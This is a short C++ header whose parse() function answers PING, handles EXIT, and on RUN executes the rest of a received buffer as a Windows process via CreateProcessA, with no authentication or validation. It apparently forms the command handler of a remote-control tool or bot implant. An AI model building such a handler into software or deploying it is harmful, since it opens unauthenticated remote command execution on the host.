#pragma once
#include <cstdio>
#include <cstring>
#include <Windows.h>

bool parse(const char* recvBuf, int recvBufLen, char* sendBuf, int sendBufLen)
{
	if (_strnicmp(recvBuf, "PING", 4) == 0)
	{
		strcpy_s(sendBuf, sendBufLen, "PONG");
		return false;
	}

	if (_strnicmp(recvBuf, "EXIT", 4) == 0)
	{
		return true;
	}

	if (_strnicmp(recvBuf, "RUN", 3) == 0)
	{
		strcpy_s(sendBuf, sendBufLen, recvBuf + 4);

		STARTUPINFOA si;
		PROCESS_INFORMATION pi;

		ZeroMemory(&si, sizeof(si));
		si.cb = sizeof(si);
		ZeroMemory(&pi, sizeof(pi));

		CreateProcessA(
			NULL,
			sendBuf,
			NULL,
			NULL,
			FALSE,
			0,
			NULL,
			NULL,
			&si,
			&pi
		);

		WaitForSingleObject(pi.hProcess, INFINITE);
		CloseHandle(pi.hProcess);
		CloseHandle(pi.hThread);
		return false;
	}

	strcpy_s(sendBuf, sendBufLen, "Unknown Command");
	return false;
}